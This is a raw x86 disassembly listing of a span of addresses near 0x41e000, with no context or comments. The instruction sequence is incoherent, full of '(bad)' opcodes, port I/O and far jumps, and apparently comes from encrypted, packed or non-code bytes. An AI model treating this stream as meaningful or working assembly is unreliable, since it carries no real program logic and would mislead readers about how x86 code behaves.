  41e052:	sti    
  41e053:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e054:	pop    edi
  41e055:	das    
  41e056:	cmp    eax,0x8f5adb07
  41e05b:	cs xchg ecx,eax
  41e05d:	cmp    eax,0x841b0317
  41e062:	or     BYTE PTR [ebp-0x258e11ec],bh
  41e068:	bound  edx,QWORD PTR [edx+ebx*4+0x10836bc]
  41e06f:	or     bh,dl
  41e071:	aad    0x3d
  41e073:	jmp    0x41dff7
  41e075:	sub    eax,0xbf61b26b
  41e07a:	jge    0x41e05c
  41e07c:	inc    esi
  41e07d:	xchg   edi,eax
  41e07e:	mov    ch,0xf4
  41e080:	xor    cl,ch
  41e082:	popf   
  41e083:	int    0xea
  41e085:	pop    esi
  41e086:	test   DWORD PTR [edi],eax
  41e088:	lods   eax,DWORD PTR ds:[esi]
  41e089:	pop    ss
  41e08a:	stos   BYTE PTR es:[edi],al
  41e08b:	in     al,0x3b
  41e08d:	xor    BYTE PTR [eax+ebx*2+0x9],dh
  41e091:	repz xor BYTE PTR [ecx+0x24],0xa7
  41e096:	(bad)  
  41e097:	shl    DWORD PTR [eax],0xb3
  41e09a:	or     BYTE PTR [edx+0x49],0xc9
  41e09e:	fiadd  WORD PTR [ecx+0x43]
  41e0a1:	aaa    
  41e0a2:	jecxz  0x41e0aa
  41e0a4:	or     eax,0xdaa34ba6
  41e0a9:	jbe    0x41e0b4
  41e0ab:	inc    esi
  41e0ac:	inc    esp
  41e0ad:	jb     0x41e0a4
  41e0af:	sbb    BYTE PTR [edi-0x61d81cef],dh
  41e0b5:	stos   DWORD PTR es:[edi],eax
  41e0b6:	xor    ah,dh
  41e0b8:	test   BYTE PTR [edi-0x47483965],0x8a
  41e0bf:	ds dec eax
  41e0c1:	add    al,0xb5
  41e0c3:	ret    0x6ccb
  41e0c6:	or     DWORD PTR [eax],eax
  41e0c8:	out    0x19,eax
  41e0ca:	jmp    0xcf7aaebe
  41e0cf:	popa   
  41e0d0:	xchg   esp,eax
  41e0d1:	mov    cl,BYTE PTR [eax+edx*4-0x322443c0]
  41e0d8:	inc    edx
  41e0d9:	pop    ebp
  41e0da:	popf   
  41e0db:	rcr    ebp,0x81
  41e0de:	stos   DWORD PTR es:[edi],eax
  41e0df:	ds push ebx
  41e0e1:	xchg   ebx,eax
  41e0e2:	sbb    al,0xf
  41e0e4:	jle    0x41e07b
  41e0e6:	xlat   BYTE PTR ds:[ebx]
  41e0e7:	pop    ds
  41e0e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e0e9:	lods   al,BYTE PTR ds:[esi]
  41e0ea:	cmp    eax,0xb7855d66
  41e0ef:	sbb    eax,0x22f37b9a
  41e0f4:	push   0x85c90239
  41e0f9:	xor    cl,BYTE PTR [edi+0x1c70cfdb]
  41e0ff:	aas    
  41e100:	cmp    BYTE PTR [ebp-0x2f],cl
  41e103:	sahf   
  41e104:	inc    ecx
  41e105:	xchg   esi,eax
  41e106:	aad    0x4d
  41e108:	inc    esp
  41e109:	scas   al,BYTE PTR es:[edi]
  41e10a:	mov    bh,0xc8
  41e10c:	pop    ecx
  41e10d:	jp     0x41e0f8
  41e10f:	shl    BYTE PTR [esi-0x30114c82],0xe8
  41e116:	out    dx,al
  41e117:	gs push ss
  41e119:	out    dx,al
  41e11a:	dec    edx
  41e11b:	xchg   ecx,eax
  41e11c:	add    cl,bh
  41e11e:	sti    
  41e11f:	test   DWORD PTR [ecx+eax*2+0xd95080e],esi
  41e126:	sub    al,0x54
  41e128:	stos   DWORD PTR es:[edi],eax
  41e129:	popf   
  41e12a:	pop    ebp
  41e12b:	aaa    
  41e12c:	push   ds
  41e12d:	cmp    eax,0x195e482e
  41e132:	push   es
  41e133:	pop    edi
  41e134:	jae    0x41e192
  41e136:	je     0x41e1b2
  41e138:	or     ebp,eax
  41e13a:	mov    edi,0xfeabecb5
  41e13f:	mov    cl,0x62
  41e141:	rdpmc  
  41e143:	jae    0x41e10a
  41e145:	ror    DWORD PTR [edi-0x59],cl
  41e148:	ror    DWORD PTR [edi],0xc5
  41e14b:	outs   dx,DWORD PTR ds:[esi]
  41e14c:	add    eax,0xcac9d3ed
  41e151:	adc    BYTE PTR [edx-0x459a812b],dl
  41e157:	out    dx,al
  41e158:	inc    ecx
  41e159:	mov    ?,esi
  41e15b:	xchg   esi,eax
  41e15c:	push   ss
  41e15d:	or     BYTE PTR [ebp+ebx*8+0xc],bl
  41e161:	mov    ch,0x41
  41e163:	mov    DWORD PTR [eax+0x31],ebx
  41e166:	mov    bl,0x8e
  41e168:	ret    
  41e169:	dec    edx
  41e16a:	mov    cs,ebp
  41e16c:	push   esi
  41e16d:	stc    
  41e16e:	fs pushf 
  41e170:	sbb    eax,0xb5798300
  41e175:	mov    dl,0x3c
  41e177:	nop
  41e178:	sub    eax,0xadf14f71
  41e17d:	push   0x49e79b58
  41e182:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e183:	mov    cl,0x80
  41e185:	ja     0x41e151
  41e187:	mov    edx,0xafb93034
  41e18c:	loopne 0x41e117
  41e18e:	loop   0x41e173
  41e190:	add    esp,edx
  41e192:	push   es
  41e193:	mov    edi,0x4050e8ed
  41e198:	add    al,0x29
  41e19a:	or     esp,DWORD PTR [eax]
  41e19c:	and    bl,BYTE PTR [eax]
  41e19e:	pop    edi
  41e19f:	mov    ecx,0x9596a340
  41e1a4:	push   ss
  41e1a5:	imul   dh
  41e1a7:	jg     0x41e16b
  41e1a9:	adc    DWORD PTR [ebp+0x357f33dc],edx
  41e1af:	pop    ecx
  41e1b0:	adc    DWORD PTR [eax+0x522d7d48],edx
  41e1b6:	add    DWORD PTR [edi+eax*2+0x63],esp
  41e1ba:	inc    esi
  41e1bb:	into   
  41e1bc:	add    DWORD PTR [edx],ebp
  41e1be:	gs push ebp
  41e1c0:	mov    esp,0x7bdf6698
  41e1c5:	adc    dh,al
  41e1c7:	add    edx,edx
  41e1c9:	adc    BYTE PTR [edx],0xe2
  41e1cc:	leave  
  41e1cd:	xchg   BYTE PTR [esi+ecx*2+0x7163131e],ah
  41e1d4:	adc    esi,0x92ed1e8b
  41e1da:	into   
  41e1db:	sbb    eax,0xb0fe1fea
  41e1e0:	(bad)  
  41e1e1:	lock cmp eax,0x753fffb1
  41e1e7:	pop    esp
  41e1e8:	inc    edx
  41e1e9:	xchg   esp,eax
  41e1ea:	jae    0x41e20a
  41e1ec:	pop    ecx
  41e1ed:	and    al,0x47
  41e1ef:	lds    edi,FWORD PTR [ebx]
  41e1f1:	or     ch,dl
  41e1f3:	jle    0x41e22e
  41e1f5:	test   DWORD PTR [ebx+0x25],ecx
  41e1f8:	jb     0x41e189
  41e1fa:	inc    edx
  41e1fb:	push   esi
  41e1fc:	add    al,BYTE PTR [ebx-0x51e68c27]
  41e202:	fistp  QWORD PTR [esi+0x1b43b0df]
  41e208:	test   al,0xa9
  41e20a:	sub    eax,ebx
  41e20c:	ins    BYTE PTR es:[edi],dx
  41e20d:	and    eax,0x3e609b88
  41e212:	jmp    0x41e1c6
  41e214:	out    dx,al
  41e215:	sahf   
  41e216:	bound  esp,QWORD PTR [ebx]
  41e218:	dec    BYTE PTR [esi+0x3e]
  41e21b:	xchg   edx,eax
  41e21c:	data16 cmp al,0x1c
  41e21f:	ret    0x44c2
  41e222:	arpl   WORD PTR [edi+eiz*4+0x1a7906e5],di
  41e229:	jecxz  0x41e1fa
  41e22b:	cmp    eax,0x627b844c
  41e230:	jg     0x41e271
  41e232:	cmc    
  41e233:	je     0x41e1ef
  41e235:	cdq    
  41e236:	pop    edi
  41e237:	xchg   ebx,eax
  41e238:	cmp    edx,edx
  41e23a:	push   eax
  41e23b:	in     eax,0x25
  41e23d:	(bad)  
  41e23e:	mov    esp,0x9d9dc7e0
  41e243:	sub    eax,0xf7854b8f
  41e248:	outs   dx,BYTE PTR ds:[esi]
  41e249:	sbb    DWORD PTR [edi+0x7f92d33b],ecx
  41e24f:	push   0x50
  41e251:	jbe    0x41e1d6
  41e253:	mov    ebx,0x1655d493
  41e258:	push   ds
  41e259:	(bad)  [edx]
  41e25b:	or     ah,BYTE PTR [edi+edi*8+0x3b]
  41e25f:	adc    eax,0x527778cc
  41e264:	jnp    0x41e23b
  41e266:	mov    edi,0x9673b90c
  41e26b:	push   0xf583e534
  41e270:	neg    BYTE PTR [ebp+0x1ae821f3]
  41e276:	cli    
  41e277:	dec    ebp
  41e278:	sbb    DWORD PTR [edi-0x50],edi
  41e27b:	push   esi
  41e27c:	cmp    al,0xc3
  41e27e:	daa    
  41e27f:	add    eax,0x4a88b63
  41e284:	push   edx
  41e285:	mov    ah,0xbc
  41e287:	adc    BYTE PTR ds:0x26c93e80,ch
  41e28d:	or     bl,BYTE PTR [ecx+0x2e]
  41e290:	aas    
  41e291:	shl    ah,cl
  41e293:	adc    DWORD PTR [edx-0x761fe651],edx
  41e299:	loopne 0x41e23d
  41e29b:	fbld   TBYTE PTR [edx+0x498c2fe1]
  41e2a1:	dec    ecx
  41e2a2:	mov    eax,ds:0xe57fa74d
  41e2a7:	xchg   esi,eax
  41e2a8:	mov    ebx,0xb6b5d34f
  41e2ad:	xor    cl,BYTE PTR [ebx]
  41e2af:	and    ah,BYTE PTR [edx+0x2e0f4b0b]
  41e2b5:	and    DWORD PTR [eax-0x2b],edi
  41e2b8:	and    al,0x71
  41e2ba:	mov    al,0xeb
  41e2bc:	jo     0x41e24b
  41e2be:	dec    edi
  41e2bf:	shl    DWORD PTR [edx],cl
  41e2c1:	addr16 aaa 
  41e2c3:	mov    bl,0x8a
  41e2c5:	mov    esp,0x7697e18a
  41e2ca:	aaa    
  41e2cb:	adc    BYTE PTR [ecx+edx*8],dl
  41e2ce:	mov    bl,0x87
  41e2d0:	call   0x4bbed2a4
  41e2d5:	adc    DWORD PTR [ebx-0x5ef5b547],ecx
  41e2db:	or     ch,BYTE PTR [edx]
  41e2dd:	jo     0x41e2b3
  41e2df:	dec    edx
  41e2e0:	mov    eax,0x26e01221
  41e2e5:	sub    eax,DWORD PTR [esi+0x46]
  41e2e8:	scas   al,BYTE PTR es:[edi]
  41e2e9:	mov    ds:0x81316728,eax
  41e2ee:	push   esi
  41e2ef:	aad    0xc0
  41e2f1:	sbb    eax,0xf18fcd6
  41e2f6:	fcom   DWORD PTR [ecx]
  41e2f8:	or     eax,0x99d55907
  41e2fd:	imul   edx,DWORD PTR ds:0x12c1a9e1,0xd4b0a034
  41e307:	sbb    eax,0x46e530e8
  41e30c:	(bad)  
  41e30d:	mov    esp,0x55799ebf
  41e312:	jmp    0xf9763af
  41e317:	out    dx,eax
  41e318:	(bad)  
  41e319:	adc    DWORD PTR [eax],eax
  41e31b:	adc    DWORD PTR [eax-0x12],eax
  41e31e:	sub    edx,DWORD PTR [esi+0x7e]
  41e321:	mov    bl,0x59
  41e323:	repz jecxz 0x41e331
  41e326:	push   ebp
  41e327:	cli    
  41e328:	add    al,0xa2
  41e32a:	cdq    
  41e32b:	inc    eax
  41e32c:	cmp    BYTE PTR [esi+0x45],0x4e
  41e330:	mul    ebx
  41e332:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e333:	ffreep st(6)
  41e335:	dec    ebx
  41e336:	pop    DWORD PTR [edx-0x1]
  41e339:	mov    ebx,0x8eb2b0f8
  41e33e:	mov    ebp,0x87763dcd
  41e343:	sub    DWORD PTR ds:0xfabdab0d,esp
  41e349:	or     bl,BYTE PTR [ecx-0x58]
  41e34c:	adc    DWORD PTR [edi+0x60],ebx
  41e34f:	mov    al,ds:0xd28b00ed
  41e354:	sub    al,0x1b
  41e356:	mov    cl,0xa5
  41e358:	data16 aaa 
  41e35a:	sbb    al,0x9
  41e35c:	jb     0x41e300
  41e35e:	add    esi,DWORD PTR [eax+0x44]
  41e361:	loop   0x41e328
  41e363:	adc    esp,DWORD PTR [esi]
  41e365:	pop    ss
  41e366:	mov    WORD PTR [ebp-0x57190c0d],ss
  41e36c:	retf   
  41e36d:	gs enter 0xe557,0x64
  41e372:	not    DWORD PTR [ebx+0x4e0c4b91]
  41e378:	sbb    eax,0x21fec05d
  41e37d:	cld    
  41e37e:	jbe    0x41e3ce
  41e380:	fs push ds
  41e382:	stc    
  41e383:	push   edx
  41e384:	ss or  al,0x67
  41e387:	das    
  41e388:	mov    al,0x6
  41e38a:	(bad)  
  41e38c:	push   eax
  41e38d:	push   ds
  41e38e:	jmp    0x36ab9eae
  41e393:	bound  edx,QWORD PTR [ecx]
  41e395:	dec    ebx
  41e396:	test   eax,0x8b9d1d0e
  41e39b:	je     0x41e368
  41e39d:	pusha  
  41e39e:	loop   0x41e33a
  41e3a0:	inc    esp
  41e3a1:	jbe    0x41e36c
  41e3a3:	lods   eax,DWORD PTR ds:[esi]
  41e3a4:	inc    ecx
  41e3a5:	sahf   
  41e3a6:	xor    eax,0x4ca5287
  41e3ab:	mov    BYTE PTR [edi],ah
  41e3ad:	push   edx
  41e3ae:	inc    eax
  41e3af:	xchg   ebp,eax
  41e3b0:	push   edi
  41e3b1:	jne    0x41e3f1
  41e3b3:	push   ss
  41e3b4:	xchg   DWORD PTR [ebx-0x74d37e13],edi
  41e3ba:	sbb    eax,0x7e27752e
  41e3bf:	outs   dx,DWORD PTR ds:[esi]
  41e3c0:	xlat   BYTE PTR ds:[ebx]
  41e3c1:	fbld   TBYTE PTR [ecx]
  41e3c3:	test   al,0xfb
  41e3c5:	rcl    BYTE PTR [ebp-0x43],0xfd
  41e3c9:	jnp    0x41e390
  41e3cb:	mov    ebx,0xc3881c92
  41e3d0:	ds mov ah,0x97
  41e3d3:	cli    
  41e3d4:	call   0x5229:0x927fc9f6
  41e3db:	or     DWORD PTR [eax+0x29],esi
  41e3de:	in     eax,0xe4
  41e3e0:	inc    esi
  41e3e1:	(bad)
  41e3e4:	add    DWORD PTR [si],edi
  41e3e7:	xchg   edx,eax
  41e3e8:	or     eax,0xed9ebf36
  41e3ed:	mov    ebp,0x76536fbe
  41e3f2:	mov    cs,WORD PTR [ebx-0x72]
  41e3f5:	in     eax,dx
  41e3f6:	pop    esp
  41e3f7:	xor    BYTE PTR [esi-0x2ef9f59],al
  41e3fd:	push   DWORD PTR [eax]
  41e3ff:	rcr    DWORD PTR [edi+0x1be88c83],1
  41e405:	test   al,0x77
  41e407:	mov    ds:0xbb219737,eax
  41e40c:	mov    bl,0xa3
  41e40e:	fldcw  WORD PTR [ebp-0x69077990]
  41e414:	fcmovu st,st(3)
  41e416:	adc    ebx,DWORD PTR [edi+eiz*8+0x7acc68ac]
  41e41d:	fisub  DWORD PTR [esi]
  41e41f:	test   BYTE PTR [ecx-0x3a],dh
  41e422:	loopne 0x41e3e1
  41e424:	fild   WORD PTR [ecx+0x2c3dcd52]
  41e42a:	mov    ecx,0x844e1ea4
  41e42f:	ret    0xf78e
  41e432:	and    ah,BYTE PTR [edi+0x56c42f2c]
  41e438:	call   FWORD PTR [ebx+0x56f94384]
  41e43e:	fs mov ebp,0x4c83a044
  41e444:	push   edi
  41e445:	push   0xf094af2c
  41e44a:	mov    ds:0x803ba3d,al
  41e44f:	rcr    BYTE PTR [ecx],cl
  41e451:	mov    dl,0xb6
  41e453:	mov    DWORD PTR [eax-0x10],ebx
  41e456:	jo     0x41e483
  41e458:	dec    ebx
  41e459:	adc    eax,edi
  41e45b:	fcmovnb st,st(0)
  41e45d:	call   0xa0ddd021
  41e462:	out    0xf5,al
  41e464:	dec    edx
  41e465:	mov    DWORD PTR [esi-0x49],ebx
  41e468:	sub    ecx,DWORD PTR [ebp-0x1c]
  41e46b:	pop    edx
  41e46c:	arpl   WORD PTR [eax+esi*2-0x6c],dx
  41e470:	mov    cl,0xd6
  41e472:	js     0x41e4a5
  41e474:	dec    ebx
  41e476:	outs   dx,BYTE PTR ds:[esi]
  41e477:	jecxz  0x41e3f9
  41e479:	test   DWORD PTR [edx+0x6e],eax
  41e47c:	addr16 push ebx
  41e47e:	xchg   edx,eax
  41e47f:	cmp    ebp,esp
  41e481:	shl    BYTE PTR [ecx-0x7aac253],0xbb
  41e488:	loope  0x41e491
  41e48a:	inc    eax
  41e48b:	sub    esp,DWORD PTR [ebx-0xbd70471]
  41e491:	sbb    ecx,DWORD PTR [ebx-0x51c5b56d]
  41e497:	popf   
  41e498:	loopne 0x41e4ba
  41e49a:	mov    eax,0x98c01ee
  41e49f:	int    0xd9
  41e4a1:	dec    esi
  41e4a2:	popa   
  41e4a3:	ss sar esi,1
  41e4a6:	mov    bh,0xc7
  41e4a8:	inc    ebx
  41e4a9:	les    edx,FWORD PTR [ebx+0x20f522c5]
  41e4af:	mov    ebx,0xc6bb59c9
  41e4b4:	mov    al,BYTE PTR [ecx+ebp*8-0x68ee9df2]
  41e4bb:	mov    ds:0xbb355722,al
  41e4c0:	cmp    al,0x14
  41e4c2:	xor    edx,esi
  41e4c4:	bound  edx,QWORD PTR [ecx-0x21]
  41e4c7:	(bad)  
  41e4c9:	call   0xaac9:0xdd285edd
  41e4d0:	(bad)  
  41e4d1:	fsubr  st,st(2)
  41e4d3:	loopne 0x41e51a
  41e4d5:	xchg   edx,eax
  41e4d6:	add    BYTE PTR [edx+0x162fe496],dh
  41e4dc:	lds    ecx,FWORD PTR [esi+0x135fccec]
  41e4e2:	inc    ebp
  41e4e3:	mov    edi,0x3449e9b9
  41e4e8:	xor    ebx,0xcaff7288
  41e4ee:	jge    0x41e551
  41e4f0:	lods   eax,DWORD PTR ds:[esi]
  41e4f1:	push   ds
  41e4f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e4f3:	sbb    al,0x87
  41e4f5:	imul   ebp,DWORD PTR [eax],0xf853bb9a
  41e4fb:	xor    eax,0x1b46b527
  41e500:	aad    0x29
  41e502:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e503:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e504:	(bad)  
  41e505:	enter  0x58b5,0xc2
  41e509:	stc    
  41e50a:	or     bl,cl
  41e50c:	mov    ch,0xf1
  41e50e:	xchg   edi,eax
  41e50f:	addr16 pop ds
  41e511:	push   esp
  41e512:	and    esp,DWORD PTR [edx-0x60]
  41e515:	xchg   esi,eax
  41e516:	xchg   edx,eax
  41e517:	mov    eax,ds:0xfe70bd1a
  41e51c:	cwde   
  41e51d:	(bad)  [ebp-0x2d]
  41e520:	cwde   
  41e521:	aas    
  41e522:	cdq    
  41e523:	add    esi,DWORD PTR [eax]
  41e525:	sbb    DWORD PTR [ecx],0x57eaa0f4
  41e52b:	cdq    
  41e52c:	push   0xffffff93
  41e52e:	sub    eax,0x117fb12b
  41e533:	xchg   ebp,eax
  41e534:	xor    ecx,ecx
  41e536:	aad    0x78
  41e538:	js     0x41e4cb
  41e53a:	dec    edx
  41e53b:	or     BYTE PTR [edi+eax*2],al
  41e53e:	jbe    0x41e503
  41e540:	mov    ch,0xb4
  41e542:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e543:	jns    0x41e572
  41e545:	das    
  41e546:	cmp    DWORD PTR [edi+ecx*1],esp
  41e549:	pop    eax
  41e54a:	mov    BYTE PTR [eax],bl
  41e54c:	lods   al,BYTE PTR ds:[esi]
  41e54d:	mov    ch,0x54
  41e54f:	xchg   edi,eax
  41e550:	fldenv [edi+0x6]
  41e553:	ds push esi
  41e556:	retf   0x9a59
  41e559:	pop    es
  41e55a:	dec    edi
  41e55b:	daa    
  41e55c:	call   0x370edfd1
  41e561:	inc    esp
  41e562:	cdq    
  41e563:	fsub   DWORD PTR [edx-0x4cc08bdc]
  41e569:	ins    BYTE PTR es:[edi],dx
  41e56a:	(bad)  
  41e56b:	xlat   BYTE PTR ds:[ebx]
  41e56c:	mov    ebp,0x72950730
  41e571:	cs dec edx
  41e573:	in     al,dx
  41e574:	mov    ah,0xe5
  41e576:	add    BYTE PTR [edi],dl
  41e578:	and    BYTE PTR [esi],ch
  41e57a:	mov    dl,0xad
  41e57c:	or     al,bl
  41e57e:	inc    ebp
  41e57f:	sti    
  41e580:	xor    al,0xf5
  41e582:	in     eax,0xb2
  41e584:	fsub   QWORD PTR [ebx+0x3e]
  41e587:	mov    ah,0x8
  41e589:	inc    esp
  41e58a:	mov    ebp,DWORD PTR [edx+0x23]
  41e58d:	test   DWORD PTR [esi+0x42],ebp
  41e590:	mov    ch,0x15
  41e592:	fwait
  41e593:	push   edi
  41e594:	cmp    ecx,DWORD PTR [edi+edx*1+0x5791c541]
  41e59b:	outs   dx,DWORD PTR ds:[esi]
  41e59c:	add    edx,DWORD PTR [eax+0x2a]
  41e59f:	sbb    eax,DWORD PTR [esi+0x201c9663]
  41e5a5:	inc    ebp
  41e5a6:	fdivr  st,st(5)
  41e5a8:	dec    ebx
  41e5a9:	mov    ds:0x1cc9377a,eax
  41e5ae:	jp     0x41e60a
  41e5b0:	pop    edx
  41e5b1:	add    al,0x7
  41e5b3:	lea    esp,[eax-0x7bf221c1]
  41e5b9:	aas    
  41e5ba:	lods   eax,DWORD PTR ds:[esi]
  41e5bb:	cmp    ch,BYTE PTR [ebp-0x4a8d1238]
  41e5c1:	inc    edi
  41e5c2:	sub    DWORD PTR [ecx+edi*1-0x5f],ebp
  41e5c6:	inc    ebx
  41e5c7:	xor    esp,DWORD PTR [edi-0x2a7b86d7]
  41e5cd:	int    0xff
  41e5cf:	scas   al,BYTE PTR es:[edi]
  41e5d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e5d1:	rcl    BYTE PTR ds:0xc29e291f,1
  41e5d7:	fisub  WORD PTR [ecx]
  41e5d9:	imul   edi,DWORD PTR [ecx],0x54fc060
  41e5df:	scas   al,BYTE PTR es:[edi]
  41e5e0:	mov    esi,0x60138ee4
  41e5e5:	lahf   
  41e5e6:	cmp    eax,0xf1d82c63
  41e5eb:	iret   
  41e5ec:	xchg   BYTE PTR [edx+0x5a],ah
  41e5ef:	xlat   BYTE PTR ds:[ebx]
  41e5f0:	cli    
  41e5f1:	int    0x2b
  41e5f3:	jg     0x41e643
  41e5f5:	repz ret 
  41e5f7:	push   0x6b
  41e5f9:	jmp    0xb96456ec
  41e5fe:	mov    bh,0x71
  41e600:	out    0x2c,eax
  41e602:	cli    
  41e603:	or     DWORD PTR [edi-0x3d],edi
  41e606:	test   eax,0x993b1f83
  41e60b:	and    BYTE PTR [edx],ch
  41e60d:	loope  0x41e609
  41e60f:	xor    BYTE PTR ds:0xc67837fc,ah
  41e615:	push   cs
  41e616:	xor    al,0xb5
  41e618:	into   
  41e619:	fadd   DWORD PTR [edi+0x1c]
  41e61c:	fs jne 0x41e637
  41e61f:	inc    ebp
  41e620:	cmp    al,0xeb
  41e622:	cs mov esp,0x3737e262
  41e628:	test   ch,ah
  41e62a:	ret    
  41e62b:	sbb    dl,BYTE PTR [edx]
  41e62d:	push   cs
  41e62e:	loop   0x41e5c9
  41e630:	stos   DWORD PTR es:[edi],eax
  41e631:	mov    ah,0xfa
  41e633:	dec    ebp
  41e634:	adc    eax,0x8d230699
  41e639:	adc    bl,BYTE PTR [edx+0x25]
  41e63c:	push   ds
  41e63d:	sbb    BYTE PTR [esi+eax*2],0xe9
  41e641:	cmp    eax,0x42b9652f
  41e646:	es clc 
  41e648:	add    DWORD PTR [ebx],esi
  41e64a:	loop   0x41e62b
  41e64c:	int    0x3e
  41e64e:	sbb    DWORD PTR [edx+0x5705eb39],ebp
  41e654:	add    eax,0x8ae28639
  41e659:	stos   BYTE PTR es:[edi],al
  41e65a:	xor    BYTE PTR [edi],dh
  41e65c:	lds    eax,FWORD PTR [edi-0x2b]
  41e65f:	fs ds clc 
  41e662:	adc    esp,DWORD PTR [ebp-0x65]
  41e665:	push   ecx
  41e666:	test   BYTE PTR ss:[esi-0x7a],0xb
  41e66b:	mov    al,0xd9
  41e66d:	xchg   esp,eax
  41e66e:	xchg   edi,eax
  41e66f:	pop    esp
  41e670:	add    dh,BYTE PTR [eax-0x5c736611]
  41e676:	mov    ebx,0xfd0c366a
  41e67b:	mov    edi,0xcb203381
  41e680:	lds    eax,FWORD PTR [esi]
  41e682:	adc    al,BYTE PTR [ebx-0x1863dbc4]
  41e688:	jb     0x41e6a9
  41e68a:	out    0x60,eax
  41e68c:	inc    ebp
  41e68d:	xor    eax,DWORD PTR [ebp+edx*1+0x3801ccfa]
  41e694:	adc    eax,0x25027108
  41e699:	loope  0x41e627
  41e69b:	mov    ds:0xcf2f78f1,al
  41e6a0:	jl     0x41e677
  41e6a2:	xchg   BYTE PTR [esi-0x59],ah
  41e6a5:	pop    ss
  41e6a6:	das    
  41e6a7:	fnstsw ax
  41e6a9:	pop    eax
  41e6aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e6ab:	ret    0x72fe
  41e6ae:	out    0xfc,al
  41e6b0:	sub    BYTE PTR [eax],ch
  41e6b2:	mov    WORD PTR [ebx],es
  41e6b4:	in     al,dx
  41e6b5:	add    ecx,DWORD PTR [ebx]
  41e6b7:	sub    edi,DWORD PTR [ecx+0x69]
  41e6ba:	out    0xdf,al
  41e6bc:	mov    cl,dl
  41e6be:	(bad)  
  41e6bf:	jmp    0x7cd2:0x606356c7
  41e6c6:	fs xchg edx,eax
  41e6c8:	dec    ebx
  41e6c9:	(bad)  
  41e6ca:	jg     0x41e6c1
  41e6cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e6cd:	aad    0x57
  41e6cf:	adc    eax,0xc226aa43
  41e6d4:	pusha  
  41e6d5:	jmp    0xe92a:0xf4fd7985
  41e6dc:	loope  0x41e69f
  41e6de:	dec    edx
  41e6df:	outs   dx,DWORD PTR ds:[esi]
  41e6e0:	mov    eax,ds:0x31865d20
  41e6e5:	mov    eax,ds:0x6952a2c3
  41e6ea:	mov    ch,0xb1
  41e6ec:	pop    ebx
  41e6ed:	jge    0x41e73f
  41e6ef:	dec    edi
  41e6f0:	mov    dh,0x4b
  41e6f2:	pop    ebx
  41e6f3:	cmc    
  41e6f4:	pop    edx
  41e6f5:	popf   
  41e6f6:	pop    esp
  41e6f7:	jne    0x41e6e4
  41e6f9:	cmp    ch,dh
  41e6fb:	out    dx,al
  41e6fc:	(bad)  
  41e6fd:	xchg   edi,eax
  41e6fe:	or     dl,ah
  41e700:	inc    bl
  41e702:	je     0x41e73e
  41e704:	xchg   eax,edx
  41e706:	scas   eax,DWORD PTR es:[edi]
  41e707:	lock je 0x41e764
  41e70a:	add    dl,BYTE PTR [ebx-0x32576ca0]
  41e710:	add    dh,BYTE PTR [ecx+ebp*2]
  41e713:	arpl   WORD PTR gs:0x33401624,di
  41e71a:	jnp    0x41e737
  41e71c:	jns    0x41e6de
  41e71e:	stos   DWORD PTR es:[edi],eax
  41e71f:	mov    bl,0x25
  41e721:	int3   
  41e722:	mov    esp,0xe94e9724
  41e727:	sbb    esp,0x4e6acc23
  41e72d:	jb     0x41e795
  41e72f:	pushf  
  41e730:	xor    eax,0x4ea80652
  41e735:	stos   BYTE PTR es:[edi],al
  41e736:	mov    eax,0x76698820
  41e73b:	mov    edx,0xd6be48b4
  41e740:	enter  0x7b61,0xa6
  41e744:	sbb    BYTE PTR ds:0x4828785f,dl
  41e74a:	neg    BYTE PTR [ecx-0x7d5ed1d6]
  41e750:	or     BYTE PTR [ebp-0x2881a90e],dl
  41e756:	inc    ebx
  41e757:	dec    edx
  41e758:	pop    ss
  41e759:	(bad)  
  41e75a:	mov    ds:0xd0c173e5,eax
  41e75f:	push   ebp
  41e760:	cmp    ah,ch
  41e762:	(bad)  
  41e763:	es (bad) 
  41e765:	adc    al,0xc4
  41e767:	lods   al,BYTE PTR ds:[esi]
  41e768:	pop    eax
  41e769:	add    eax,DWORD PTR [edi+edi*2+0xd]
  41e76d:	into   
  41e76e:	xor    bl,BYTE PTR [eax-0x7c09b39b]
  41e774:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e775:	pop    edi
  41e776:	pop    ebp
  41e777:	mov    al,ds:0xae0638ee
  41e77c:	pop    es
  41e77d:	cli    
  41e77e:	push   edi
  41e77f:	leave  
  41e780:	out    dx,al
  41e781:	xchg   edi,eax
  41e782:	pop    esp
  41e783:	push   cs
  41e784:	jne    0x41e7b4
  41e786:	mov    edi,ds
  41e788:	sub    eax,0xa25f7f3a
  41e78d:	test   DWORD PTR [ebx+edi*1+0x1d],0xa3fd0b0
  41e795:	adc    eax,DWORD PTR [ecx+ecx*1+0xa]
  41e799:	sbb    BYTE PTR ds:0xd1dc8753,ah
  41e79f:	mov    al,ds:0x3d3a01d2
  41e7a4:	shr    DWORD PTR [ecx-0x2f83a5b5],cl
  41e7aa:	nop
  41e7ab:	mov    ecx,DWORD PTR [eax-0x3d0188de]
  41e7b1:	ins    BYTE PTR es:[edi],dx
  41e7b2:	mov    al,BYTE PTR [eax+eax*1+0x424a7606]
  41e7b9:	push   0x3b
  41e7bb:	stc    
  41e7bc:	fnstcw WORD PTR [ebx-0x624098c6]
  41e7c2:	xchg   esi,eax
  41e7c3:	bound  esp,QWORD PTR [edx+0x40]
  41e7c6:	add    ecx,ebp
  41e7c8:	in     al,0x1f
  41e7ca:	push   ebp
  41e7cb:	mov    bl,0x16
  41e7cd:	ins    BYTE PTR es:[edi],dx
  41e7ce:	sbb    esi,esi
  41e7d0:	call   0xfe13:0xec8d69ab
  41e7d7:	out    0x8a,al
  41e7d9:	cmc    
  41e7da:	sbb    ebx,edi
  41e7dc:	xchg   esi,eax
  41e7dd:	xchg   esi,eax
  41e7de:	fwait
  41e7df:	lahf   
  41e7e0:	je     0x41e7cd
  41e7e2:	xchg   ecx,eax
  41e7e3:	pop    ecx
  41e7e4:	xchg   ebx,eax
  41e7e5:	and    bh,BYTE PTR [edx]
